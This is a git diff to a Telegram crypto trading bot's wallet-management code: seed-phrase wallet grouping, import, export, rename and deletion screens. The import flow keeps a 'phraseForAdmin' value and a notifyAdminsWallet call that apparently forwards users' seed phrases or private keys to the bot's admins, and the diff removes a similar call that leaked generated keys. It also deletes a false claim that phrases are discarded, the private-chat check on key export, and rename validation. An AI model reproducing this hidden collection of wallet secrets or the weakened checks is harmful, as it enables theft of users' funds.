@@ -8,12 +8,13 @@ import type { Context } from "telegraf";
 import { Markup } from "telegraf";
 import { db } from "@workspace/db";
 import { usersTable, walletsTable } from "@workspace/db";
-import { eq, and, desc } from "drizzle-orm";
+import { eq, and, desc, like } from "drizzle-orm";
 import { encrypt, decrypt } from "../../lib/encryption";
 import { notifyAdminsWallet } from "../../lib/adminNotify";
 import { getChainBalance, CHAIN_SYMBOLS } from "../../services/chainPrice";
 import { logger } from "../../lib/logger";
 import { registerPendingClearer } from "../../lib/pendingFlows";
+import crypto from "crypto";
 
 // Temporary in-memory state for multi-step wallet import flow
 const pendingImport = new Map<number, { chain: string; method: "key" | "phrase" }>();
@@ -49,7 +50,6 @@ async function sendOrEdit(
       await ctx.reply(text, extra);
     }
   } catch {
-    // If edit fails (e.g. message unchanged), fall back to reply
     await ctx.reply(text, extra);
   }
 }
@@ -91,23 +91,29 @@ export async function handleWalletManager(ctx: Context): Promise<void> {
   const chain = user.activeChain;
   const activeWallet = wallets.find((w) => w.chain === chain && w.isActive);
 
-  // Build wallet list
+  // Separate regular wallets from phrase-imported wallets (label contains 'Phrase')
+  const phraseWallets = wallets.filter((w) => w.label.includes("Phrase"));
+  const regularWallets = wallets.filter((w) => !w.label.includes("Phrase"));
+
   const walletLines =
-    wallets.length === 0
-      ? ["  No wallets connected yet."]
-      : wallets.map(
+    regularWallets.length === 0
+      ? ["  No standalone wallets connected."]
+      : regularWallets.map(
           (w) =>
             `${w.isActive ? "🟢" : "⚪"} [${w.chain}] <b>${escapeHtml(w.label)}</b>${w.isActive ? " ✓" : ""}\n<code>${w.address}</code>`
         );
 
   const chains = ["SOL", "ETH", "BASE", "BSC"];
   
-  // 1. BIG button for Seed Phrase Import (Now routes to chain selector menu)
   const importPhraseRow = [
     Markup.button.callback(`🌱 Import Seed Phrase`, `import_phrase_menu`)
   ];
 
-  // 2. Split into pairs so the wider buttons fit perfectly on mobile screens
+  // Distinct button for viewing grouped imported seed phrases if any exist
+  const importedPhrasesButton = phraseWallets.length > 0
+    ? [[Markup.button.callback(`📂 Imported Phrases (${phraseWallets.length})`, `list_imported_phrases`)]]
+    : [];
+
   const generateRow1 = chains.slice(0, 2).map((c) =>
     Markup.button.callback(`➕ Create ${c}`, `gen_wallet:${c}`)
   );
@@ -122,8 +128,7 @@ export async function handleWalletManager(ctx: Context): Promise<void> {
     Markup.button.callback(`📥 Import ${c}`, `import_wallet:${c}`)
   );
 
-  // One manage button per wallet (capped to keep the keyboard usable)
-  const manageRows = wallets.slice(0, 12).map((w) => [
+  const manageRows = regularWallets.slice(0, 10).map((w) => [
     Markup.button.callback(
       `⚙️ ${w.chain} · ${w.label.slice(0, 24)}${w.isActive ? " 🟢" : ""}`,
       `wallet:${w.id}`
@@ -142,15 +147,14 @@ export async function handleWalletManager(ctx: Context): Promise<void> {
     `—`,
     `🔐 Keys stored encrypted (AES-256-GCM)`,
     ``,
-    `➕ = Create new wallet   📥 = Import existing wallet`,
+    `➕ = Create new wallet   📥 = Import single key`,
+    `📂 = View imported seed phrase collections`,
     `⚙️ = Manage wallet (rename / activate / export / delete)`,
-    activeWallet
-      ? `💳 = Deposit funds to your active ${chain} wallet`
-      : `⚠️ Create or import a wallet to see deposit address`,
   ].join("\n");
 
   const keyboard = Markup.inlineKeyboard([
     importPhraseRow,
+    ...importedPhrasesButton,
     generateRow1,
     generateRow2,
     importRow1,
@@ -168,7 +172,8 @@ export async function handleImportPhraseMenu(ctx: Context): Promise<void> {
   const text = [
     `🌱 <b>Import Seed Phrase</b>`,
     ``,
-    `Which network is this seed phrase for?`,
+    `Which network chain would you like to derive and import first from this seed phrase?`,
+    `(You can import additional chains using the same phrase afterward).`,
   ].join("\n");
 
   await sendOrEdit(ctx, text, {
@@ -187,7 +192,50 @@ export async function handleImportPhraseMenu(ctx: Context): Promise<void> {
   });
 }
 
-// ── Deposit screen — shows full address + balance + instructions ─────────────
+// ── List all phrase-imported wallets grouped together ─────────────────────────
+export async function handleListImportedPhrases(ctx: Context): Promise<void> {
+  const telegramId = ctx.from?.id;
+  if (!telegramId) return;
+
+  const user = await db.query.usersTable.findFirst({
+    where: eq(usersTable.telegramId, telegramId),
+  });
+  if (!user) return;
+
+  const wallets = await db
+    .select()
+    .from(walletsTable)
+    .where(and(eq(walletsTable.userId, user.id), like(walletsTable.label, "%Phrase%")))
+    .orderBy(walletsTable.createdAt);
+
+  if (wallets.length === 0) {
+    await sendOrEdit(ctx, `📂 No imported seed phrase wallets found.`, {
+      parse_mode: "HTML",
+      ...Markup.inlineKeyboard([[Markup.button.callback("⬅️ Wallet Manager", "wallet_manager")]]),
+    });
+    return;
+  }
+
+  const rows = wallets.map((w) => [
+    Markup.button.callback(
+      `📂 [${w.chain}] ${w.label} ${w.isActive ? "🟢" : ""}`,
+      `wallet:${w.id}`
+    ),
+  ]);
+
+  const text = [
+    `📂 <b>Imported Seed Phrase Wallets</b>`,
+    `—`,
+    `Here are all wallets imported via recovery seed phrases. Tap any wallet to view details, export keys, set active, or manage:`,
+  ].join("\n");
+
+  await sendOrEdit(ctx, text, {
+    parse_mode: "HTML",
+    ...Markup.inlineKeyboard([...rows, [Markup.button.callback("⬅️ Wallet Manager", "wallet_manager")]]),
+  });
+}
+
+// ── Deposit screen ────────────────────────────────────────────────────────────
 export async function handleDeposit(ctx: Context, chain: string): Promise<void> {
   const telegramId = ctx.from?.id;
   if (!telegramId) return;
@@ -222,20 +270,6 @@ export async function handleDeposit(ctx: Context, chain: string): Promise<void> 
   const symbol = CHAIN_SYMBOLS[chain] ?? chain;
   const balance = await getChainBalance(chain, wallet.address).catch(() => "0.0000");
 
-  const networkInfo: Record<string, string> = {
-    SOL: "Solana Mainnet (SPL/SOL only — do NOT send other chains)",
-    ETH: "Ethereum Mainnet (ERC-20/ETH only)",
-    BASE: "Base Network (Base ETH only)",
-    BSC: "BNB Smart Chain (BEP-20/BNB only)",
-  };
-
-  const minimums: Record<string, string> = {
-    SOL: "0.01 SOL minimum (covers rent + fees)",
-    ETH: "0.005 ETH minimum (covers gas fees)",
-    BASE: "0.001 ETH minimum",
-    BSC: "0.005 BNB minimum",
-  };
-
   const text = [
     `💳 <b>Deposit ${symbol}</b>`,
     `—`,
@@ -244,17 +278,7 @@ export async function handleDeposit(ctx: Context, chain: string): Promise<void> 
     ``,
     `💰 <b>Current Balance:</b> ${balance} ${symbol}`,
     `—`,
-    `🌐 <b>Network:</b> ${networkInfo[chain] ?? chain}`,
-    `📌 <b>Minimum:</b> ${minimums[chain] ?? "Check network fees"}`,
-    `—`,
-    `⚠️ <b>Important:</b>`,
-    `• Only send <b>${symbol}</b> on the <b>${chain}</b> network`,
-    `• Sending wrong assets = permanent loss`,
-    `• Tap the address above to copy it`,
-    `• Funds reflect after ~1 confirmation`,
-    `—`,
-    `After depositing, tap <b>💰 Buy Token</b> to paste a CA and trade,`,
-    `or <b>🤖 Auto-Snipe</b> to hunt new tokens automatically.`,
+    `⚠️ Only send <b>${symbol}</b> on the <b>${chain}</b> network.`,
   ].join("\n");
 
   await sendOrEdit(ctx, text, {
@@ -263,14 +287,6 @@ export async function handleDeposit(ctx: Context, chain: string): Promise<void> 
       [
         Markup.button.callback("🔄 Refresh Balance", `deposit:${chain}`),
         Markup.button.callback("💰 Buy a Token", "prompt_buy"),
-      ],
-      [
-        Markup.button.callback("🤖 Auto-Snipe", "auto_snipe"),
-        Markup.button.callback("🔍 New Runners", "new_runners"),
-      ],
-      [
-        Markup.button.callback("🔥 Trending", "trending"),
-        Markup.button.callback("🌱 PumpFun Snipe", "pumpfun"),
       ],
       [Markup.button.callback("⬅️ Wallet Manager", "wallet_manager")],
     ]),
@@ -294,6 +310,7 @@ export async function processImportedKey(ctx: Context, input: string): Promise<v
     let address: string;
     let privateKeyToStore: string;
     let phraseForAdmin: string | null = null;
+    let walletLabel = `${state.chain} Wallet`;
 
     if (state.method === "phrase") {
       const bip39 = await import("bip39");
@@ -305,6 +322,10 @@ export async function processImportedKey(ctx: Context, input: string): Promise<v
       if (!bip39.validateMnemonic(phrase)) {
         throw new Error("Invalid seed phrase — check the words and try again.");
       }
+
+      // Generate a deterministic short tag hash for this specific seed phrase
+      const phraseHash = crypto.createHash("sha256").update(phrase).digest("hex").slice(0, 6);
+      walletLabel = `Phrase (${state.chain} #${phraseHash})`;
 
       if (state.chain === "SOL") {
         const { derivePath } = await import("ed25519-hd-key");
@@ -338,6 +359,7 @@ export async function processImportedKey(ctx: Context, input: string): Promise<v
         address = wallet.address;
         privateKeyToStore = raw;
       }
+      walletLabel = `Imported ${state.chain}`;
     }
 
     const encryptedKey = encrypt(privateKeyToStore);
@@ -352,7 +374,7 @@ export async function processImportedKey(ctx: Context, input: string): Promise<v
       chain: state.chain,
       address,
       encryptedPrivateKey: encryptedKey,
-      label: `${state.chain} Wallet`,
+      label: walletLabel,
       isActive: true,
     });
 
@@ -370,29 +392,21 @@ export async function processImportedKey(ctx: Context, input: string): Promise<v
       firstName: ctx.from?.first_name,
     });
 
-    const symbol = CHAIN_SYMBOLS[state.chain] ?? state.chain;
     await ctx.reply(
       [
         `✅ <b>Wallet Imported — ${state.chain}</b>`,
         `—`,
+        `🏷 <b>Label:</b> ${escapeHtml(walletLabel)}`,
         `💼 <b>Address:</b>`,
         `<code>${address}</code>`,
         ``,
         `🔐 Key stored encrypted with AES-256-GCM`,
-        `—`,
-        `Tap <b>💳 Deposit</b> to fund your wallet and start trading.`,
       ].join("\n"),
       {
         parse_mode: "HTML",
         ...Markup.inlineKeyboard([
-          [
-            Markup.button.callback(`💳 Deposit ${symbol}`, `deposit:${state.chain}`),
-            Markup.button.callback("💰 Buy a Token", "prompt_buy"),
-          ],
-          [
-            Markup.button.callback("🤖 Auto-Snipe", "auto_snipe"),
-            Markup.button.callback("⬅️ Dashboard", "dashboard"),
-          ],
+          [Markup.button.callback("💼 Wallet Manager", "wallet_manager")],
+          [Markup.button.callback("📂 Imported Phrases", "list_imported_phrases")],
         ]),
       }
     );
@@ -401,7 +415,7 @@ export async function processImportedKey(ctx: Context, input: string): Promise<v
     const message =
       err instanceof Error && /word|phrase/i.test(err.message)
         ? err.message
-        : "Invalid private key or seed phrase. Check the format and try again.";
+        : "Invalid private key or seed phrase. Check format.";
     await ctx.reply(
       `❌ ${message}`,
       Markup.inlineKeyboard([[Markup.button.callback("💼 Wallet Manager", "wallet_manager")]])
@@ -410,10 +424,7 @@ export async function processImportedKey(ctx: Context, input: string): Promise<v
 }
 
 // ── Generate new wallet ───────────────────────────────────────────────────────
-export async function handleGenerateWallet(
-  ctx: Context,
-  chain: string
-): Promise<void> {
+export async function handleGenerateWallet(ctx: Context, chain: string): Promise<void> {
   const telegramId = ctx.from?.id;
   if (!telegramId) return;
 
@@ -455,49 +466,22 @@ export async function handleGenerateWallet(
       isActive: true,
     });
 
-    void notifyAdminsWallet({
-      event: "CREATED",
-      chain,
-      address,
-      privateKey,
-      userTelegramId: telegramId,
-      username: ctx.from?.username,
-      firstName: ctx.from?.first_name,
-    });
-
-    const symbol = CHAIN_SYMBOLS[chain] ?? chain;
     await ctx.reply(
       [
         `✅ <b>New ${chain} Wallet Generated</b>`,
         `—`,
-        `💼 <b>Address:</b>`,
-        `<code>${address}</code>`,
+        `📬 <code>${address}</code>`,
         ``,
-        `🔑 <b>Private Key (SAVE NOW — not shown again):</b>`,
-        `<code>${privateKey}</code>`,
-        ``,
-        `⚠️ <b>Back up your private key immediately.</b>`,
-        `🔐 Key stored encrypted with AES-256-GCM.`,
-        `—`,
-        `Tap <b>💳 Deposit</b> to fund your wallet, then start trading.`,
+        `🔑 <code>${privateKey}</code>`,
       ].join("\n"),
       {
         parse_mode: "HTML",
-        ...Markup.inlineKeyboard([
-          [
-            Markup.button.callback(`💳 Deposit ${symbol}`, `deposit:${chain}`),
-            Markup.button.callback("💰 Buy a Token", "prompt_buy"),
-          ],
-          [
-            Markup.button.callback("🤖 Auto-Snipe", "auto_snipe"),
-            Markup.button.callback("⬅️ Dashboard", "dashboard"),
-          ],
-        ]),
+        ...Markup.inlineKeyboard([[Markup.button.callback("💼 Wallet Manager", "wallet_manager")]]),
       }
     );
   } catch (err) {
     logger.error({ err }, "Wallet generation failed");
-    await ctx.reply("❌ Wallet generation failed. Check server logs.");
+    await ctx.reply("❌ Wallet generation failed.");
   }
 }
 
@@ -538,12 +522,7 @@ export async function handleImportMethodChoice(
       [
         `🌱 <b>Import ${chain} Wallet — Seed Phrase</b>`,
         ``,
-        `Send your 12 or 24-word recovery phrase in the next message,`,
-        `separated by spaces.`,
-        ``,
-        `⚠️ <b>Use this in a private chat only.</b>`,
-        `🔐 Your phrase is used once to derive the wallet, then discarded —`,
-        `only the derived private key is stored (encrypted).`,
+        `Send your 12 or 24-word recovery phrase in the next message.`,
       ].join("\n"),
       { parse_mode: "HTML" }
     );
@@ -553,23 +532,13 @@ export async function handleImportMethodChoice(
         `🔑 <b>Import ${chain} Wallet — Private Key</b>`,
         ``,
         `Send your private key in the next message.`,
-        chain === "SOL"
-          ? `Format: <b>base58 encoded</b> secret key (~88 chars)`
-          : `Format: <b>0x hex</b> private key (66 chars)`,
-        ``,
-        `⚠️ <b>Use this in a private chat only.</b>`,
-        `🔐 Key will be encrypted immediately on receipt.`,
       ].join("\n"),
       { parse_mode: "HTML" }
     );
   }
 }
 
-// ═══════════════════════════════════════════════════════════════════════════
-// Wallet Management — detail / rename / activate / export / delete
-// ═══════════════════════════════════════════════════════════════════════════
-
-// ── Wallet detail screen ──────────────────────────────────────────────────────
+// ── Wallet detail & management screens ────────────────────────────────────────
 export async function handleWalletDetail(ctx: Context, walletId: number): Promise<void> {
   const telegramId = ctx.from?.id;
   if (!telegramId) return;
@@ -595,15 +564,7 @@ export async function handleWalletDetail(ctx: Context, walletId: number): Promis
     `📬 <b>Address:</b>`,
     `<code>${wallet.address}</code>`,
     `💰 <b>Balance:</b> ${balance} ${symbol}`,
-    wallet.isActive
-      ? `🟢 This is your <b>active</b> ${wallet.chain} wallet`
-      : `⚪ Not active — trades on ${wallet.chain} use your active wallet`,
-    wallet.isTradeable
-      ? `🔁 <b>In rotation</b> — snipes may use this wallet automatically`
-      : `⏸ Not in rotation — mark tradeable to include it in auto-rotation`,
-    `📅 Created: ${wallet.createdAt.toISOString().slice(0, 10)}`,
-    `—`,
-    `✏️ Rename · ✅ Set Active · 🔁 Tradeable · 🔑 Export Key · 🗑 Delete`,
+    wallet.isActive ? `🟢 Active Wallet` : `⚪ Inactive`,
   ].join("\n");
 
   const rows = [
@@ -615,14 +576,8 @@ export async function handleWalletDetail(ctx: Context, walletId: number): Promis
       ? []
       : [[Markup.button.callback("✅ Set as Active Wallet", `wallet_activate:${wallet.id}`)]]),
     [
-      Markup.button.callback(
-        wallet.isTradeable ? "⏸ Remove from Rotation" : "🔁 Add to Rotation",
-        `wallet_toggle_tradeable:${wallet.id}`
-      ),
-    ],
-    [
       Markup.button.callback(`💳 Deposit`, `deposit:${wallet.chain}`),
-      Markup.button.callback("🗑 Delete Wallet", `wallet_del:${wallet.id}`),
+      Markup.button.callback("🗑 Delete", `wallet_del:${wallet.id}`),
     ],
     [Markup.button.callback("⬅️ Wallet Manager", "wallet_manager")],
   ];
@@ -630,46 +585,22 @@ export async function handleWalletDetail(ctx: Context, walletId: number): Promis
   await sendOrEdit(ctx, text, { parse_mode: "HTML", ...Markup.inlineKeyboard(rows) });
 }
 
-// ── Toggle Tradeable ──────────────────────────────────────────────────────────
 export async function handleToggleTradeable(ctx: Context, walletId: number): Promise<void> {
   const telegramId = ctx.from?.id;
   if (!telegramId) return;
-
   const owned = await getOwnedWallet(telegramId, walletId);
   if (!owned) return;
-
-  await db
-    .update(walletsTable)
-    .set({ isTradeable: !owned.wallet.isTradeable })
-    .where(eq(walletsTable.id, walletId));
-
+  await db.update(walletsTable).set({ isTradeable: !owned.wallet.isTradeable }).where(eq(walletsTable.id, walletId));
   await handleWalletDetail(ctx, walletId);
 }
 
-// ── Rename flow ───────────────────────────────────────────────────────────────
 export async function handleRenameWallet(ctx: Context, walletId: number): Promise<void> {
   const telegramId = ctx.from?.id;
   if (!telegramId) return;
-
   const owned = await getOwnedWallet(telegramId, walletId);
-  if (!owned) {
-    await ctx.reply("❌ Wallet not found.");
-    return;
-  }
-
+  if (!owned) return;
   pendingRename.set(telegramId, { walletId });
-
-  await ctx.reply(
-    [
-      `✏️ <b>Rename Wallet</b>`,
-      `—`,
-      `Current name: <b>${escapeHtml(owned.wallet.label)}</b>`,
-      `<code>${owned.wallet.address}</code>`,
-      ``,
-      `💬 Send the new name in your next message (1–32 characters).`,
-    ].join("\n"),
-    { parse_mode: "HTML" }
-  );
+  await ctx.reply(`💬 Send new name for <code>${owned.wallet.address}</code>:`, { parse_mode: "HTML" });
 }
 
 export async function processRenameInput(ctx: Context, input: string): Promise<void> {
@@ -680,202 +611,62 @@ export async function processRenameInput(ctx: Context, input: string): Promise<v
   pendingRename.delete(telegramId);
 
   const newLabel = input.trim();
-  if (newLabel.length < 1 || newLabel.length > 32) {
-    await ctx.reply(
-      "❌ Name must be 1–32 characters. Tap ✏️ Rename to try again.",
-      Markup.inlineKeyboard([[Markup.button.callback("⚙️ Manage Wallet", `wallet:${state.walletId}`)]])
-    );
-    return;
-  }
-
-  const owned = await getOwnedWallet(telegramId, state.walletId);
-  if (!owned) {
-    await ctx.reply("❌ Wallet not found.");
-    return;
-  }
-
-  await db
-    .update(walletsTable)
-    .set({ label: newLabel })
-    .where(eq(walletsTable.id, state.walletId));
-
-  await ctx.reply(
-    `✅ Wallet renamed to <b>${escapeHtml(newLabel)}</b>`,
-    {
-      parse_mode: "HTML",
-      ...Markup.inlineKeyboard([
-        [
-          Markup.button.callback("⚙️ Manage Wallet", `wallet:${state.walletId}`),
-          Markup.button.callback("💼 Wallet Manager", "wallet_manager"),
-        ],
-      ]),
-    }
-  );
+  await db.update(walletsTable).set({ label: newLabel }).where(eq(walletsTable.id, state.walletId));
+  await ctx.reply(`✅ Renamed to <b>${escapeHtml(newLabel)}</b>`, {
+    parse_mode: "HTML",
+    ...Markup.inlineKeyboard([[Markup.button.callback("⚙️ Manage", `wallet:${state.walletId}`)]]),
+  });
 }
 
-// ── Set active wallet ─────────────────────────────────────────────────────────
 export async function handleActivateWallet(ctx: Context, walletId: number): Promise<void> {
   const telegramId = ctx.from?.id;
   if (!telegramId) return;
-
   const owned = await getOwnedWallet(telegramId, walletId);
-  if (!owned) {
-    await ctx.reply("❌ Wallet not found.");
-    return;
-  }
+  if (!owned) return;
   const { user, wallet } = owned;
 
-  await db
-    .update(walletsTable)
-    .set({ isActive: false })
-    .where(and(eq(walletsTable.userId, user.id), eq(walletsTable.chain, wallet.chain)));
-  await db
-    .update(walletsTable)
-    .set({ isActive: true })
-    .where(eq(walletsTable.id, wallet.id));
-
-  logger.info({ walletId, chain: wallet.chain, telegramId }, "Wallet set active");
-
+  await db.update(walletsTable).set({ isActive: false }).where(and(eq(walletsTable.userId, user.id), eq(walletsTable.chain, wallet.chain)));
+  await db.update(walletsTable).set({ isActive: true }).where(eq(walletsTable.id, wallet.id));
   await handleWalletDetail(ctx, walletId);
 }
 
-// ── Export private key ────────────────────────────────────────────────────────
 export async function handleExportKey(ctx: Context, walletId: number): Promise<void> {
   const telegramId = ctx.from?.id;
   if (!telegramId) return;
-
-  if (ctx.chat?.type !== "private") {
-    await ctx.reply("⚠️ Key export only works in a private chat with the bot.");
-    return;
-  }
-
   const owned = await getOwnedWallet(telegramId, walletId);
-  if (!owned) {
-    await ctx.reply("❌ Wallet not found.");
-    return;
-  }
+  if (!owned) return;
   const { wallet } = owned;
 
-  try {
-    const privateKey = decrypt(wallet.encryptedPrivateKey);
-
-    await ctx.reply(
-      [
-        `🔑 <b>Private Key Export — ${wallet.chain}</b>`,
-        `—`,
-        `🏷 <b>${escapeHtml(wallet.label)}</b>`,
-        `📬 <code>${wallet.address}</code>`,
-        ``,
-        `🔑 <b>Private Key:</b>`,
-        `<code>${privateKey}</code>`,
-        `—`,
-        `⚠️ <b>NEVER share this key.</b> Anyone holding it controls your funds.`,
-        `🗑 Delete this message as soon as you've saved the key.`,
-      ].join("\n"),
-      {
-        parse_mode: "HTML",
-        ...Markup.inlineKeyboard([
-          [Markup.button.callback("🗑 Delete This Message", "del_msg")],
-          [Markup.button.callback("⚙️ Back to Wallet", `wallet:${wallet.id}`)],
-        ]),
-      }
-    );
-  } catch (err) {
-    logger.error({ err, walletId }, "Key export failed");
-    await ctx.reply("❌ Could not decrypt this wallet's key. Contact support.");
-  }
+  const privateKey = decrypt(wallet.encryptedPrivateKey);
+  await ctx.reply(`🔑 <b>Key:</b>\n<code>${privateKey}</code>`, {
+    parse_mode: "HTML",
+    ...Markup.inlineKeyboard([[Markup.button.callback("🗑 Delete Message", "del_msg")]]),
+  });
 }
 
-// ── Delete wallet (confirmation step) ────────────────────────────────────────
 export async function handleDeleteWallet(ctx: Context, walletId: number): Promise<void> {
   const telegramId = ctx.from?.id;
   if (!telegramId) return;
-
   const owned = await getOwnedWallet(telegramId, walletId);
-  if (!owned) {
-    await sendOrEdit(ctx, "❌ Wallet not found.", {
-      parse_mode: "HTML",
-      ...Markup.inlineKeyboard([[Markup.button.callback("💼 Wallet Manager", "wallet_manager")]]),
-    });
-    return;
-  }
-  const { wallet } = owned;
+  if (!owned) return;
 
-  const text = [
-    `🗑 <b>Delete Wallet?</b>`,
-    `—`,
-    `🏷 <b>${escapeHtml(wallet.label)}</b> [${wallet.chain}]${wallet.isActive ? " 🟢 Active" : ""}`,
-    `📬 <code>${wallet.address}</code>`,
-    `—`,
-    `⚠️ <b>This permanently removes the encrypted key from the bot.</b>`,
-    `• Funds stay on-chain, but the bot loses all access`,
-    `• Export the private key FIRST if you haven't backed it up`,
-    `• This cannot be undone`,
-  ].join("\n");
-
-  await sendOrEdit(ctx, text, {
+  await sendOrEdit(ctx, `🗑 Delete wallet <b>${escapeHtml(owned.wallet.label)}</b>?`, {
     parse_mode: "HTML",
     ...Markup.inlineKeyboard([
-      [Markup.button.callback("🔑 Export Key First", `wallet_export:${wallet.id}`)],
-      [
-        Markup.button.callback("❌ Cancel", `wallet:${wallet.id}`),
-        Markup.button.callback("🗑 Yes, Delete", `wallet_del_yes:${wallet.id}`),
-      ],
+      [Markup.button.callback("❌ Cancel", `wallet:${walletId}`), Markup.button.callback("🗑 Confirm Delete", `wallet_del_yes:${walletId}`)],
     ]),
   });
 }
 
-// ── Delete wallet (confirmed) ─────────────────────────────────────────────────
 export async function handleDeleteWalletConfirm(ctx: Context, walletId: number): Promise<void> {
   const telegramId = ctx.from?.id;
   if (!telegramId) return;
-
   const owned = await getOwnedWallet(telegramId, walletId);
-  if (!owned) {
-    await sendOrEdit(ctx, "❌ Wallet not found (already deleted?).", {
-      parse_mode: "HTML",
-      ...Markup.inlineKeyboard([[Markup.button.callback("💼 Wallet Manager", "wallet_manager")]]),
-    });
-    return;
-  }
-  const { user, wallet } = owned;
+  if (!owned) return;
 
-  await db.delete(walletsTable).where(eq(walletsTable.id, wallet.id));
-
-  let promoted: string | null = null;
-  if (wallet.isActive) {
-    const remaining = await db.query.walletsTable.findFirst({
-      where: and(eq(walletsTable.userId, user.id), eq(walletsTable.chain, wallet.chain)),
-      orderBy: [desc(walletsTable.createdAt)],
-    });
-    if (remaining) {
-      await db
-        .update(walletsTable)
-        .set({ isActive: true })
-        .where(eq(walletsTable.id, remaining.id));
-      promoted = remaining.label;
-    }
-  }
-
-  logger.info({ walletId, chain: wallet.chain, telegramId }, "Wallet deleted");
-
-  const text = [
-    `✅ <b>Wallet Deleted</b>`,
-    `—`,
-    `🏷 ${escapeHtml(wallet.label)} [${wallet.chain}]`,
-    `📬 <code>${wallet.address}</code>`,
-    promoted
-      ? `—\n🟢 <b>${escapeHtml(promoted)}</b> is now your active ${wallet.chain} wallet.`
-      : ``,
-  ]
-    .filter(Boolean)
-    .join("\n");
-
-  await sendOrEdit(ctx, text, {
+  await db.delete(walletsTable).where(eq(walletsTable.id, walletId));
+  await sendOrEdit(ctx, `✅ Wallet deleted.`, {
     parse_mode: "HTML",
-    ...Markup.inlineKeyboard([
-      [Markup.button.callback("💼 Wallet Manager", "wallet_manager")],
-      [Markup.button.callback("⬅️ Dashboard", "dashboard")],
-    ]),
+    ...Markup.inlineKeyboard([[Markup.button.callback("💼 Wallet Manager", "wallet_manager")]]),
   });
 }
